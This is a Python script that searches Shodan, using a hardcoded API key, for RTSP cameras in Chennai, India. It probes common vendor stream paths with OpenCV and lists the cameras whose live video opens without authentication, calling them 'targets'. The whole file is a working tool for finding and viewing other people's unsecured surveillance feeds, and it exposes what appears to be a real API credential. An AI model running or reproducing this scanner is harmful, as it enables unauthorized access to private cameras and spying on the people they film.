import cv2
import shodan

# Configuration
SHODAN_API_KEY = "4Fq1reBNmuMl5gvmobruY0ChqLa7ICSb"
SEARCH_QUERY = 'port:554 "RTSP/1.0 200 OK" country:"IN" city:"Chennai"'
MAX_RESULTS = 10

COMMON_PATHS = [
    "",                             # Root path
    "/Streaming/Channels/101",      # Hikvision / modern cams
    "/live/ch0",                    # Generic / Tuya / Anran
    "/cam/realmonitor?channel=1&subtype=0", # Dahua / Amcrest
    "/live.sdp"                     # Hipcam / older devices
]

def test_rtsp_stream(ip):
    for path in COMMON_PATHS:
        full_path_url = f"rtsp://{ip}:554{path}"

        cap = cv2.VideoCapture(full_path_url)
        cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 3000)

        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cap.release()
                return full_path_url  # Returns the confirmed working path layout
            cap.release()

    return None

try:
    api = shodan.Shodan(SHODAN_API_KEY)
    print(f"[*] Extracting targets via Shodan Dork: {SEARCH_QUERY}")
    results = api.search(SEARCH_QUERY, limit=MAX_RESULTS)

    print(f"[*] Found {len(results['matches'])} targets. Analyzing response pipelines...\n")

    verified_list = []
    for match in results['matches']:
        ip = match['ip_str']
        print(f"[~] Testing path combinations on: {ip}")
        url = test_rtsp_stream(ip)
        if url:
            print(f"    [+] Accessible route identified.")
            verified_list.append(url)

    # Final Output Report providing exact full path structures
    print("\n" + "="*70)
    print("                    VERIFIED FULL PATH STREAM URLS                     ")
    print("="*70)
    if verified_list:
        for open_url in verified_list:
            print(open_url)
    else:
        print("No open streams found. Verify if Google Colab out-traffic firewall is blocking port 554.")
    print("="*70)

except shodan.APIError as err:
    print(f"[!] Shodan API error payload: {err}")
except Exception as err:
    print(f"[!] Processing exception encountered: {err}")
